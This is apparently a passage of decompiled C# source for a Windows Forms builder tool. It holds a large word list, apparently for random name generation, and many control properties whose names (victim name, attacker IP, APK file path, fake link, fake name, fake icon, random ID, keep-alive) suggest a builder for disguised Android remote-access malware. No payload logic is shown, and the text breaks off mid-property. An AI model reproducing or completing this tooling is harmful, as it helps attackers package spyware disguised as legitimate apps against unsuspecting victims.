				"telescope",
				"television",
				"televisions",
				"tell",
				"telling",
				"tells",
				"temp",
				"temperature",
				"temperatures",
				"template",
				"templates",
				"temple",
				"temporal",
				"temporarily",
				"temporary",
				"ten",
				"tenant",
				"tend",
				"tender",
				"tennessee",
				"tennis",
				"tension",
				"tent",
				"term",
				"terminal",
				"terminals",
				"termination",
				"terminology",
				"terms",
				"terrace",
				"terrain",
				"terrible",
				"territories",
				"territory",
				"terror",
				"terrorism",
				"terrorist",
				"terrorists",
				"terry",
				"test",
				"testament",
				"tested",
				"testimonials",
				"testimony",
				"testing",
				"tests",
				"tex",
				"texas",
				"text",
				"textbook",
				"textbooks",
				"textile",
				"textiles",
				"texts",
				"texture",
				"tf",
				"tft",
				"tgp",
				"th",
				"thai",
				"thailand",
				"than",
				"thank",
				"thanks",
				"thanksgiving",
				"that",
				"thats",
				"the",
				"theater",
				"theaters",
				"theatre",
				"thee",
				"theft",
				"thehun",
				"their",
				"them",
				"theme",
				"themes",
				"themselves",
				"then",
				"theology",
				"theorem",
				"theoretical",
				"theories",
				"theory",
				"therapeutic",
				"therapist",
				"therapy",
				"there",
				"thereafter",
				"thereby",
				"therefore",
				"thereof",
				"thermal",
				"thesaurus",
				"these",
				"thesis",
				"they",
				"thick",
				"thickness",
				"thin",
				"thing",
				"things",
				"think",
				"thinking",
				"thinkpad",
				"thinks",
				"third",
				"thirty",
				"this",
				"thomas",
				"thompson",
				"thomson",
				"thong",
				"thongs",
				"thorough",
				"thoroughly",
				"those",
				"thou",
				"though",
				"thought",
				"thoughts",
				"thousand",
				"thousands",
				"thread",
				"threaded",
				"threads",
				"threat",
				"threatened",
				"threatening",
				"threats",
				"three",
				"threesome",
				"threshold",
				"thriller",
				"throat",
				"through",
				"throughout",
				"throw",
				"throwing",
				"thrown",
				"throws",
				"thru",
				"thu",
				"thumb",
				"thumbnail",
				"thumbnails",
				"thumbs",
				"thumbzilla",
				"thunder",
				"thursday",
				"thus",
				"thy",
				"ti",
				"ticket",
				"tickets",
				"tide",
				"tie",
				"tied",
				"tier",
				"ties",
				"tiffany",
				"tiger",
				"tigers",
				"tight",
				"til",
				"tile",
				"tiles",
				"till",
				"tim",
				"timber",
				"time",
				"timeline",
				"timely",
				"timer",
				"times",
				"timing",
				"timothy",
				"tin",
				"tiny",
				"tion",
				"tions",
				"tip",
				"tips",
				"tire",
				"tired",
				"tires",
				"tissue",
				"tit",
				"titanium",
				"titans",
				"title",
				"titled",
				"titles",
				"tits",
				"titten",
				"tm",
				"tmp",
				"tn",
				"to",
				"tobacco",
				"tobago",
				"today",
				"todd",
				"toddler",
				"toe",
				"together",
				"toilet",
				"token",
				"tokyo",
				"told",
				"tolerance",
				"toll",
				"tom",
				"tomato",
				"tomatoes",
				"tommy",
				"tomorrow",
				"ton",
				"tone",
				"toner",
				"tones",
				"tongue",
				"tonight",
				"tons",
				"tony",
				"too",
				"took",
				"tool",
				"toolbar",
				"toolbox",
				"toolkit",
				"tools",
				"tooth",
				"top",
				"topic",
				"topics",
				"topless",
				"tops",
				"toronto",
				"torture",
				"toshiba",
				"total",
				"totally",
				"totals",
				"touch",
				"touched",
				"tough",
				"tour",
				"touring",
				"tourism",
				"tourist",
				"tournament",
				"tournaments",
				"tours",
				"toward",
				"towards",
				"tower",
				"towers",
				"town",
				"towns",
				"township",
				"toxic",
				"toy",
				"toyota",
				"toys",
				"tp",
				"tr",
				"trace",
				"track",
				"trackback",
				"trackbacks",
				"tracked",
				"tracker",
				"tracking",
				"tracks",
				"tract",
				"tractor",
				"tracy",
				"trade",
				"trademark",
				"trademarks",
				"trader",
				"trades",
				"trading",
				"tradition",
				"traditional",
				"traditions",
				"traffic",
				"tragedy",
				"trail",
				"trailer",
				"trailers",
				"trails",
				"train",
				"trained",
				"trainer",
				"trainers",
				"training",
				"trains",
				"tramadol",
				"trance",
				"tranny",
				"trans",
				"transaction",
				"transactions",
				"transcript",
				"transcription",
				"transcripts",
				"transexual",
				"transexuales",
				"transfer",
				"transferred",
				"transfers",
				"transform",
				"transformation",
				"transit",
				"transition",
				"translate",
				"translated",
				"translation",
				"translations",
				"translator",
				"transmission",
				"transmit",
				"transmitted",
				"transparency",
				"transparent",
				"transport",
				"transportation",
				"transsexual",
				"trap",
				"trash",
				"trauma",
				"travel",
				"traveler",
				"travelers",
				"traveling",
				"traveller",
				"travelling",
				"travels",
				"travesti",
				"travis",
				"tray",
				"treasure",
				"treasurer",
				"treasures",
				"treasury",
				"treat",
				"treated",
				"treating",
				"treatment",
				"treatments",
				"treaty",
				"tree",
				"trees",
				"trek",
				"trembl",
				"tremendous",
				"trend",
				"trends",
				"treo",
				"tri",
				"trial",
				"trials",
				"triangle",
				"tribal",
				"tribe",
				"tribes",
				"tribunal",
				"tribune",
				"tribute",
				"trick",
				"tricks",
				"tried",
				"tries",
				"trigger",
				"trim",
				"trinidad",
				"trinity",
				"trio",
				"trip",
				"tripadvisor",
				"triple",
				"trips",
				"triumph",
				"trivia",
				"troops",
				"tropical",
				"trouble",
				"troubleshooting",
				"trout",
				"troy",
				"truck",
				"trucks",
				"true",
				"truly",
				"trunk",
				"trust",
				"trusted",
				"trustee",
				"trustees",
				"trusts",
				"truth",
				"try",
				"trying",
				"ts",
				"tsunami",
				"tt",
				"tu",
				"tub",
				"tube",
				"tubes",
				"tucson",
				"tue",
				"tuesday",
				"tuition",
				"tulsa",
				"tumor",
				"tune",
				"tuner",
				"tunes",
				"tuning",
				"tunisia",
				"tunnel",
				"turbo",
				"turkey",
				"turkish",
				"turn",
				"turned",
				"turner",
				"turning",
				"turns",
				"turtle",
				"tutorial",
				"tutorials",
				"tv",
				"tvcom",
				"tvs",
				"twelve",
				"twenty",
				"twice",
				"twiki",
				"twin",
				"twinks",
				"twins",
				"twist",
				"twisted",
				"two",
				"tx",
				"ty",
				"tyler",
				"type",
				"types",
				"typical",
				"typically",
				"typing",
				"u",
				"uc",
				"uganda",
				"ugly",
				"uh",
				"ui",
				"uk",
				"ukraine",
				"ul",
				"ultimate",
				"ultimately",
				"ultra",
				"ultram",
				"um",
				"un",
				"una",
				"unable",
				"unauthorized",
				"unavailable",
				"uncertainty",
				"uncle",
				"und",
				"undefined",
				"under",
				"undergraduate",
				"underground",
				"underlying",
				"understand",
				"understanding",
				"understood",
				"undertake",
				"undertaken",
				"underwear",
				"undo",
				"une",
				"unemployment",
				"unexpected",
				"unfortunately",
				"uni",
				"unified",
				"uniform",
				"union",
				"unions",
				"uniprotkb",
				"unique",
				"unit",
				"united",
				"units",
				"unity",
				"univ",
				"universal",
				"universe",
				"universities",
				"university",
				"unix",
				"unknown",
				"unless",
				"unlike",
				"unlikely",
				"unlimited",
				"unlock",
				"unnecessary",
				"unsigned",
				"unsubscribe",
				"until",
				"untitled",
				"unto",
				"unusual",
				"unwrap",
				"up",
				"upc",
				"upcoming",
				"update",
				"updated",
				"updates",
				"updating",
				"upgrade",
				"upgrades",
				"upgrading",
				"upload",
				"uploaded",
				"upon",
				"upper",
				"ups",
				"upset",
				"upskirt",
				"upskirts",
				"ur",
				"urban",
				"urge",
				"urgent",
				"uri",
				"url",
				"urls",
				"uruguay",
				"urw",
				"us",
				"usa",
				"usage",
				"usb",
				"usc",
				"usd",
				"usda",
				"use",
				"used",
				"useful",
				"user",
				"username",
				"users",
				"uses",
				"usgs",
				"using",
				"usps",
				"usr",
				"usual",
				"usually",
				"ut",
				"utah",
				"utc",
				"utilities",
				"utility",
				"utilization",
				"utilize",
				"utils",
				"uv",
				"uw",
				"uzbekistan",
				"v",
				"va",
				"vacancies",
				"vacation",
				"vacations",
				"vaccine",
				"vacuum",
				"vagina",
				"val",
				"valentine",
				"valid",
				"validation",
				"validity",
				"valium",
				"valley",
				"valuable",
				"valuation",
				"value",
				"valued",
				"values",
				"valve",
				"valves",
				"vampire",
				"van",
				"vancouver",
				"vanilla",
				"var",
				"variable",
				"variables",
				"variance",
				"variation",
				"variations",
				"varied",
				"varies",
				"variety",
				"various",
				"vary",
				"varying",
				"vast",
				"vat",
				"vatican",
				"vault",
				"vb",
				"vbulletin",
				"vc",
				"vcr",
				"ve",
				"vector",
				"vegas",
				"vegetable",
				"vegetables",
				"vegetarian",
				"vegetation",
				"vehicle",
				"vehicles",
				"velocity",
				"velvet",
				"vendor",
				"vendors",
				"venezuela",
				"venice",
				"venture",
				"ventures",
				"venue",
				"venues",
				"ver",
				"verbal",
				"verde",
				"verification",
				"verified",
				"verify",
				"verizon",
				"vermont",
				"vernon",
				"verse",
				"version",
				"versions",
				"versus",
				"vertex",
				"vertical",
				"very",
				"verzeichnis",
				"vessel",
				"vessels",
				"veteran",
				"veterans",
				"veterinary",
				"vg",
				"vhs",
				"vi",
				"via",
				"viagra",
				"vibrator",
				"vibrators",
				"vic",
				"vice",
				"victim",
				"victims",
				"victor",
				"victoria",
				"victorian",
				"victory",
				"vid",
				"video",
				"videos",
				"vids",
				"vienna",
				"vietnam",
				"vietnamese",
				"view",
				"viewed",
				"viewer",
				"viewers",
				"viewing",
				"viewpicture",
				"views",
				"vii",
				"viii",
				"viking",
				"villa",
				"village",
				"villages",
				"villas",
				"vincent",
				"vintage",
				"vinyl",
				"violation",
				"violations",
				"violence",
				"violent",
				"violin",
				"vip",
				"viral",
				"virgin",
				"virginia",
				"virtual",
				"virtually",
				"virtue",
				"virus",
				"viruses",
				"visa",
				"visibility",
				"visible",
				"vision",
				"visit",
				"visited",
				"visiting",
				"visitor",
				"visitors",
				"visits",
				"vista",
				"visual",
				"vital",
				"vitamin",
				"vitamins",
				"vocabulary",
				"vocal",
				"vocals",
				"vocational",
				"voice",
				"voices",
				"void",
				"voip",
				"vol",
				"volkswagen",
				"volleyball",
				"volt",
				"voltage",
				"volume",
				"volumes",
				"voluntary",
				"volunteer",
				"volunteers",
				"volvo",
				"von",
				"vote",
				"voted",
				"voters",
				"votes",
				"voting",
				"voyeur",
				"voyeurweb",
				"voyuer",
				"vp",
				"vpn",
				"vs",
				"vsnet",
				"vt",
				"vulnerability",
				"vulnerable",
				"w",
				"wa",
				"wage",
				"wages",
				"wagner",
				"wagon",
				"wait",
				"waiting",
				"waiver",
				"wake",
				"wal",
				"wales",
				"walk",
				"walked",
				"walker",
				"walking",
				"walks",
				"wall",
				"wallace",
				"wallet",
				"wallpaper",
				"wallpapers",
				"walls",
				"walnut",
				"walt",
				"walter",
				"wan",
				"wang",
				"wanna",
				"want",
				"wanted",
				"wanting",
				"wants",
				"war",
				"warcraft",
				"ward",
				"ware",
				"warehouse",
				"warm",
				"warming",
				"warned",
				"warner",
				"warning",
				"warnings",
				"warrant",
				"warranties",
				"warranty",
				"warren",
				"warrior",
				"warriors",
				"wars",
				"was",
				"wash",
				"washer",
				"washing",
				"washington",
				"waste",
				"watch",
				"watched",
				"watches",
				"watching",
				"water",
				"waterproof",
				"waters",
				"watershed",
				"watson",
				"watt",
				"watts",
				"wav",
				"wave",
				"waves",
				"wax",
				"way",
				"wayne",
				"ways",
				"wb",
				"wc",
				"we",
				"weak",
				"wealth",
				"weapon",
				"weapons",
				"wear",
				"wearing",
				"weather",
				"web",
				"webcam",
				"webcams",
				"webcast",
				"weblog",
				"weblogs",
				"webmaster",
				"webmasters",
				"webpage",
				"webshots",
				"website",
				"websites",
				"webster",
				"wed",
				"wedding",
				"weddings",
				"wednesday",
				"weed",
				"week",
				"weekend",
				"weekends",
				"weekly",
				"weeks",
				"weight",
				"weighted",
				"weights",
				"weird",
				"welcome",
				"welding",
				"welfare",
				"well",
				"wellington",
				"wellness",
				"wells",
				"welsh",
				"wendy",
				"went",
				"were",
				"wesley",
				"west",
				"western",
				"westminster",
				"wet",
				"whale",
				"what",
				"whatever",
				"whats",
				"wheat",
				"wheel",
				"wheels",
				"when",
				"whenever",
				"where",
				"whereas",
				"wherever",
				"whether",
				"which",
				"while",
				"whilst",
				"white",
				"who",
				"whole",
				"wholesale",
				"whom",
				"whore",
				"whose",
				"why",
				"wi",
				"wichita",
				"wicked",
				"wide",
				"widely",
				"wider",
				"widescreen",
				"widespread",
				"width",
				"wife",
				"wifi",
				"wiki",
				"wikipedia",
				"wild",
				"wilderness",
				"wildlife",
				"wiley",
				"will",
				"william",
				"williams",
				"willing",
				"willow",
				"wilson",
				"win",
				"wind",
				"window",
				"windows",
				"winds",
				"windsor",
				"wine",
				"wines",
				"wing",
				"wings",
				"winner",
				"winners",
				"winning",
				"wins",
				"winston",
				"winter",
				"wire",
				"wired",
				"wireless",
				"wires",
				"wiring",
				"wisconsin",
				"wisdom",
				"wise",
				"wish",
				"wishes",
				"wishlist",
				"wit",
				"witch",
				"with",
				"withdrawal",
				"within",
				"without",
				"witness",
				"witnesses",
				"wives",
				"wizard",
				"wm",
				"wma",
				"wn",
				"wolf",
				"woman",
				"women",
				"womens",
				"won",
				"wonder",
				"wonderful",
				"wondering",
				"wood",
				"wooden",
				"woods",
				"wool",
				"worcester",
				"word",
				"wordpress",
				"words",
				"work",
				"worked",
				"worker",
				"workers",
				"workflow",
				"workforce",
				"working",
				"workout",
				"workplace",
				"works",
				"workshop",
				"workshops",
				"workstation",
				"world",
				"worldcat",
				"worlds",
				"worldsex",
				"worldwide",
				"worm",
				"worn",
				"worried",
				"worry",
				"worse",
				"worship",
				"worst",
				"worth",
				"worthy",
				"would",
				"wound",
				"wow",
				"wp",
				"wr",
				"wrap",
				"wrapped",
				"wrapping",
				"wrestling",
				"wright",
				"wrist",
				"write",
				"writer",
				"writers",
				"writes",
				"writing",
				"writings",
				"written",
				"wrong",
				"wrote",
				"ws",
				"wt",
				"wto",
				"wu",
				"wv",
				"ww",
				"www",
				"wx",
				"wy",
				"wyoming",
				"x",
				"xanax",
				"xbox",
				"xerox",
				"xhtml",
				"xi",
				"xl",
				"xml",
				"xnxx",
				"xp",
				"xx",
				"xxx",
				"y",
				"ya",
				"yacht",
				"yahoo",
				"yale",
				"yamaha",
				"yang",
				"yard",
				"yards",
				"yarn",
				"ye",
				"yea",
				"yeah",
				"year",
				"yearly",
				"years",
				"yeast",
				"yellow",
				"yemen",
				"yen",
				"yes",
				"yesterday",
				"yet",
				"yield",
				"yields",
				"yn",
				"yo",
				"yoga",
				"york",
				"yorkshire",
				"you",
				"young",
				"younger",
				"your",
				"yours",
				"yourself",
				"youth",
				"yr",
				"yrs",
				"yu",
				"yugoslavia",
				"yukon",
				"z",
				"za",
				"zambia",
				"zdnet",
				"zealand",
				"zen",
				"zero",
				"zimbabwe",
				"zinc",
				"zip",
				"zoloft",
				"zone",
				"zones",
				"zoning",
				"zoo",
				"zoom",
				"zoophilia",
				"zope",
				"zshops",
				"zu",
				"zum",
				"zus"
			};
			this.random_1 = new Random();
			this.random_2 = null;
			this.rectangles_0 = new List<Rectangle>();
			this.rectangles_1 = new List<Rectangle>();
			this.rectangles_2 = new List<Rectangle>();
			this.InitializeComponent();
		}

		// Token: 0x1700025D RID: 605
		// (get) Token: 0x060008C6 RID: 2246 RVA: 0x00005BF5 File Offset: 0x00003DF5
		// (set) Token: 0x060008C7 RID: 2247 RVA: 0x00065D84 File Offset: 0x00063F84
		internal virtual DataGridView DGV0 { get; set; }

		// Token: 0x1700025E RID: 606
		// (get) Token: 0x060008C8 RID: 2248 RVA: 0x00005BFD File Offset: 0x00003DFD
		// (set) Token: 0x060008C9 RID: 2249 RVA: 0x00065D98 File Offset: 0x00063F98
		internal virtual NumericUpDown po { get; set; }

		// Token: 0x1700025F RID: 607
		// (get) Token: 0x060008CA RID: 2250 RVA: 0x00005C05 File Offset: 0x00003E05
		// (set) Token: 0x060008CB RID: 2251 RVA: 0x00065DAC File Offset: 0x00063FAC
		internal virtual Panel Panel1
		{
			[CompilerGenerated]
			get
			{
				return this._Panel1;
			}
			[CompilerGenerated]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.Panel1_Paint);
				Panel panel = this._Panel1;
				if (panel != null)
				{
					panel.Paint -= value2;
				}
				this._Panel1 = value;
				panel = this._Panel1;
				if (panel != null)
				{
					panel.Paint += value2;
				}
			}
		}

		// Token: 0x17000260 RID: 608
		// (get) Token: 0x060008CC RID: 2252 RVA: 0x00005C0D File Offset: 0x00003E0D
		// (set) Token: 0x060008CD RID: 2253 RVA: 0x00065DF0 File Offset: 0x00063FF0
		internal virtual TextBox TextIP { get; set; }

		// Token: 0x17000261 RID: 609
		// (get) Token: 0x060008CE RID: 2254 RVA: 0x00005C15 File Offset: 0x00003E15
		// (set) Token: 0x060008CF RID: 2255 RVA: 0x00065E04 File Offset: 0x00064004
		internal virtual Panel box { get; set; }

		// Token: 0x17000262 RID: 610
		// (get) Token: 0x060008D0 RID: 2256 RVA: 0x00005C1D File Offset: 0x00003E1D
		// (set) Token: 0x060008D1 RID: 2257 RVA: 0x00065E18 File Offset: 0x00064018
		internal virtual Panel Panel3
		{
			[CompilerGenerated]
			get
			{
				return this._Panel3;
			}
			[CompilerGenerated]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.Panel3_Paint);
				Panel panel = this._Panel3;
				if (panel != null)
				{
					panel.Paint -= value2;
				}
				this._Panel3 = value;
				panel = this._Panel3;
				if (panel != null)
				{
					panel.Paint += value2;
				}
			}
		}

		// Token: 0x17000263 RID: 611
		// (get) Token: 0x060008D2 RID: 2258 RVA: 0x00005C25 File Offset: 0x00003E25
		// (set) Token: 0x060008D3 RID: 2259 RVA: 0x00065E5C File Offset: 0x0006405C
		internal virtual TextBox TextVersion
		{
			[CompilerGenerated]
			get
			{
				return this._TextVersion;
			}
			[CompilerGenerated]
			set
			{
				KeyPressEventHandler value2 = new KeyPressEventHandler(this.TextVersion_KeyPress);
				KeyEventHandler value3 = new KeyEventHandler(this.TextVersion_KeyDown);
				TextBox textVersion = this._TextVersion;
				if (textVersion != null)
				{
					textVersion.KeyPress -= value2;
					textVersion.KeyDown -= value3;
				}
				this._TextVersion = value;
				textVersion = this._TextVersion;
				if (textVersion != null)
				{
					textVersion.KeyPress += value2;
					textVersion.KeyDown += value3;
				}
			}
		}

		// Token: 0x17000264 RID: 612
		// (get) Token: 0x060008D4 RID: 2260 RVA: 0x00005C2D File Offset: 0x00003E2D
		// (set) Token: 0x060008D5 RID: 2261 RVA: 0x00065EBC File Offset: 0x000640BC
		internal virtual TextBox TextNamePatch { get; set; }

		// Token: 0x17000265 RID: 613
		// (get) Token: 0x060008D6 RID: 2262 RVA: 0x00005C35 File Offset: 0x00003E35
		// (set) Token: 0x060008D7 RID: 2263 RVA: 0x00065ED0 File Offset: 0x000640D0
		internal virtual TextBox TextNameVictim { get; set; }

		// Token: 0x170002CC RID: 716
		// (get) Token: 0x060008D8 RID: 2264 RVA: 0x00005C3D File Offset: 0x00003E3D
		// (set) Token: 0x060008D9 RID: 2265 RVA: 0x00065EE4 File Offset: 0x000640E4
		internal virtual System.Windows.Forms.Timer TiMAT
		{
			[CompilerGenerated]
			get
			{
				return this._TiMAT;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TiMAT_Tick);
				System.Windows.Forms.Timer tiMAT = this._TiMAT;
				if (tiMAT != null)
				{
					tiMAT.Tick -= value2;
				}
				this._TiMAT = value;
				tiMAT = this._TiMAT;
				if (tiMAT != null)
				{
					tiMAT.Tick += value2;
				}
			}
		}

		// Token: 0x17000266 RID: 614
		// (get) Token: 0x060008DA RID: 2266 RVA: 0x00005C45 File Offset: 0x00003E45
		// (set) Token: 0x060008DB RID: 2267 RVA: 0x00065F28 File Offset: 0x00064128
		internal virtual DataGridViewTextBoxColumn Column2 { get; set; }

		// Token: 0x17000267 RID: 615
		// (get) Token: 0x060008DC RID: 2268 RVA: 0x00005C4D File Offset: 0x00003E4D
		// (set) Token: 0x060008DD RID: 2269 RVA: 0x00065F3C File Offset: 0x0006413C
		internal virtual FolderBrowserDialog FolderPath { get; set; }

		// Token: 0x170002CD RID: 717
		// (get) Token: 0x060008DE RID: 2270 RVA: 0x00005C55 File Offset: 0x00003E55
		// (set) Token: 0x060008DF RID: 2271 RVA: 0x00065F50 File Offset: 0x00064150
		internal virtual OpenFileDialog FilePathApk { get; set; }

		// Token: 0x170002CE RID: 718
		// (get) Token: 0x060008E0 RID: 2272 RVA: 0x00005C5D File Offset: 0x00003E5D
		// (set) Token: 0x060008E1 RID: 2273 RVA: 0x00065F64 File Offset: 0x00064164
		internal virtual System.Windows.Forms.Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				System.Windows.Forms.Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x170002CF RID: 719
		// (get) Token: 0x060008E2 RID: 2274 RVA: 0x00005C65 File Offset: 0x00003E65
		// (set) Token: 0x060008E3 RID: 2275 RVA: 0x00065FA8 File Offset: 0x000641A8
		internal virtual System.Windows.Forms.Timer startTime
		{
			[CompilerGenerated]
			get
			{
				return this._startTime;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.startTime_Tick);
				System.Windows.Forms.Timer startTime = this._startTime;
				if (startTime != null)
				{
					startTime.Tick -= value2;
				}
				this._startTime = value;
				startTime = this._startTime;
				if (startTime != null)
				{
					startTime.Tick += value2;
				}
			}
		}

		// Token: 0x17000268 RID: 616
		// (get) Token: 0x060008E4 RID: 2276 RVA: 0x00005C6D File Offset: 0x00003E6D
		// (set) Token: 0x060008E5 RID: 2277 RVA: 0x00065FEC File Offset: 0x000641EC
		internal virtual TextBox TextPackage
		{
			[CompilerGenerated]
			get
			{
				return this._TextPackage;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TextPackage_TextChanged);
				KeyEventHandler value3 = new KeyEventHandler(this.TextPackage_KeyDown);
				KeyPressEventHandler value4 = new KeyPressEventHandler(this.TextPackage_KeyPress);
				TextBox textPackage = this._TextPackage;
				if (textPackage != null)
				{
					textPackage.TextChanged -= value2;
					textPackage.KeyDown -= value3;
					textPackage.KeyPress -= value4;
				}
				this._TextPackage = value;
				textPackage = this._TextPackage;
				if (textPackage != null)
				{
					textPackage.TextChanged += value2;
					textPackage.KeyDown += value3;
					textPackage.KeyPress += value4;
				}
			}
		}

		// Token: 0x17000269 RID: 617
		// (get) Token: 0x060008E6 RID: 2278 RVA: 0x00005C75 File Offset: 0x00003E75
		// (set) Token: 0x060008E7 RID: 2279 RVA: 0x00066068 File Offset: 0x00064268
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x1700026A RID: 618
		// (get) Token: 0x060008E8 RID: 2280 RVA: 0x00005C7D File Offset: 0x00003E7D
		// (set) Token: 0x060008E9 RID: 2281 RVA: 0x0006607C File Offset: 0x0006427C
		internal virtual Label Label1 { get; set; }

		// Token: 0x1700026B RID: 619
		// (get) Token: 0x060008EA RID: 2282 RVA: 0x00005C85 File Offset: 0x00003E85
		// (set) Token: 0x060008EB RID: 2283 RVA: 0x00066090 File Offset: 0x00064290
		internal virtual Label MainText { get; set; }

		// Token: 0x1700026C RID: 620
		// (get) Token: 0x060008EC RID: 2284 RVA: 0x00005C8D File Offset: 0x00003E8D
		// (set) Token: 0x060008ED RID: 2285 RVA: 0x000660A4 File Offset: 0x000642A4
		internal virtual Label Label4 { get; set; }

		// Token: 0x1700026D RID: 621
		// (get) Token: 0x060008EE RID: 2286 RVA: 0x00005C95 File Offset: 0x00003E95
		// (set) Token: 0x060008EF RID: 2287 RVA: 0x000660B8 File Offset: 0x000642B8
		internal virtual Label Label9 { get; set; }

		// Token: 0x1700026E RID: 622
		// (get) Token: 0x060008F0 RID: 2288 RVA: 0x00005C9D File Offset: 0x00003E9D
		// (set) Token: 0x060008F1 RID: 2289 RVA: 0x000660CC File Offset: 0x000642CC
		internal virtual Label Label3 { get; set; }

		// Token: 0x1700026F RID: 623
		// (get) Token: 0x060008F2 RID: 2290 RVA: 0x00005CA5 File Offset: 0x00003EA5
		// (set) Token: 0x060008F3 RID: 2291 RVA: 0x000660E0 File Offset: 0x000642E0
		internal virtual Label Label2 { get; set; }

		// Token: 0x17000270 RID: 624
		// (get) Token: 0x060008F4 RID: 2292 RVA: 0x00005CAD File Offset: 0x00003EAD
		// (set) Token: 0x060008F5 RID: 2293 RVA: 0x000660F4 File Offset: 0x000642F4
		internal virtual Label keeplivelabel { get; set; }

		// Token: 0x17000271 RID: 625
		// (get) Token: 0x060008F6 RID: 2294 RVA: 0x00005CB5 File Offset: 0x00003EB5
		// (set) Token: 0x060008F7 RID: 2295 RVA: 0x00066108 File Offset: 0x00064308
		internal virtual Label Label5 { get; set; }

		// Token: 0x17000272 RID: 626
		// (get) Token: 0x060008F8 RID: 2296 RVA: 0x00005CBD File Offset: 0x00003EBD
		// (set) Token: 0x060008F9 RID: 2297 RVA: 0x0006611C File Offset: 0x0006431C
		internal virtual Label Label11 { get; set; }

		// Token: 0x170002D0 RID: 720
		// (get) Token: 0x060008FA RID: 2298 RVA: 0x00005CC5 File Offset: 0x00003EC5
		// (set) Token: 0x060008FB RID: 2299 RVA: 0x00066130 File Offset: 0x00064330
		internal virtual StyleManager StyleManager1 { get; set; }

		// Token: 0x170002D1 RID: 721
		// (get) Token: 0x060008FC RID: 2300 RVA: 0x00005CCD File Offset: 0x00003ECD
		// (set) Token: 0x060008FD RID: 2301 RVA: 0x00066144 File Offset: 0x00064344
		internal virtual ToolTip ToolTip1 { get; set; }

		// Token: 0x17000273 RID: 627
		// (get) Token: 0x060008FE RID: 2302 RVA: 0x00005CD5 File Offset: 0x00003ED5
		// (set) Token: 0x060008FF RID: 2303 RVA: 0x00066158 File Offset: 0x00064358
		internal virtual Label Label12 { get; set; }

		// Token: 0x17000274 RID: 628
		// (get) Token: 0x06000900 RID: 2304 RVA: 0x00005CDD File Offset: 0x00003EDD
		// (set) Token: 0x06000901 RID: 2305 RVA: 0x0006616C File Offset: 0x0006436C
		internal virtual MetroSetComboBox combotype
		{
			[CompilerGenerated]
			get
			{
				return this._combotype;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.combotype_SelectedIndexChanged);
				MetroSetComboBox combotype = this._combotype;
				if (combotype != null)
				{
					combotype.SelectedIndexChanged -= value2;
				}
				this._combotype = value;
				combotype = this._combotype;
				if (combotype != null)
				{
					combotype.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x17000275 RID: 629
		// (get) Token: 0x06000902 RID: 2306 RVA: 0x00005CE5 File Offset: 0x00003EE5
		// (set) Token: 0x06000903 RID: 2307 RVA: 0x000661B0 File Offset: 0x000643B0
		internal virtual Label Label20 { get; set; }

		// Token: 0x17000276 RID: 630
		// (get) Token: 0x06000904 RID: 2308 RVA: 0x00005CED File Offset: 0x00003EED
		// (set) Token: 0x06000905 RID: 2309 RVA: 0x000661C4 File Offset: 0x000643C4
		internal virtual Label Label7 { get; set; }

		// Token: 0x17000277 RID: 631
		// (get) Token: 0x06000906 RID: 2310 RVA: 0x00005CF5 File Offset: 0x00003EF5
		// (set) Token: 0x06000907 RID: 2311 RVA: 0x000661D8 File Offset: 0x000643D8
		internal virtual Label Label21 { get; set; }

		// Token: 0x17000278 RID: 632
		// (get) Token: 0x06000908 RID: 2312 RVA: 0x00005CFD File Offset: 0x00003EFD
		// (set) Token: 0x06000909 RID: 2313 RVA: 0x000661EC File Offset: 0x000643EC
		internal virtual Panel fakepanel { get; set; }

		// Token: 0x17000279 RID: 633
		// (get) Token: 0x0600090A RID: 2314 RVA: 0x00005D05 File Offset: 0x00003F05
		// (set) Token: 0x0600090B RID: 2315 RVA: 0x00066200 File Offset: 0x00064400
		internal virtual Button Button1
		{
			[CompilerGenerated]
			get
			{
				return this._Button1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				Button button = this._Button1;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button1 = value;
				button = this._Button1;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x1700027A RID: 634
		// (get) Token: 0x0600090C RID: 2316 RVA: 0x00005D0D File Offset: 0x00003F0D
		// (set) Token: 0x0600090D RID: 2317 RVA: 0x00066244 File Offset: 0x00064444
		internal virtual PictureBox fakeiconpic { get; set; }

		// Token: 0x1700027B RID: 635
		// (get) Token: 0x0600090E RID: 2318 RVA: 0x00005D15 File Offset: 0x00003F15
		// (set) Token: 0x0600090F RID: 2319 RVA: 0x00066258 File Offset: 0x00064458
		internal virtual TextBox Textfakelink { get; set; }

		// Token: 0x1700027C RID: 636
		// (get) Token: 0x06000910 RID: 2320 RVA: 0x00005D1D File Offset: 0x00003F1D
		// (set) Token: 0x06000911 RID: 2321 RVA: 0x0006626C File Offset: 0x0006446C
		internal virtual TextBox Textfakename { get; set; }

		// Token: 0x1700027D RID: 637
		// (get) Token: 0x06000912 RID: 2322 RVA: 0x00005D25 File Offset: 0x00003F25
		// (set) Token: 0x06000913 RID: 2323 RVA: 0x00066280 File Offset: 0x00064480
		internal virtual Label Label23 { get; set; }

		// Token: 0x1700027E RID: 638
		// (get) Token: 0x06000914 RID: 2324 RVA: 0x00005D2D File Offset: 0x00003F2D
		// (set) Token: 0x06000915 RID: 2325 RVA: 0x00066294 File Offset: 0x00064494
		internal virtual Label Label22 { get; set; }

		// Token: 0x1700027F RID: 639
		// (get) Token: 0x06000916 RID: 2326 RVA: 0x00005D35 File Offset: 0x00003F35
		// (set) Token: 0x06000917 RID: 2327 RVA: 0x000662A8 File Offset: 0x000644A8
		internal virtual Button randomidbtn
		{
			[CompilerGenerated]
			get
			{
				return this._randomidbtn;
			}
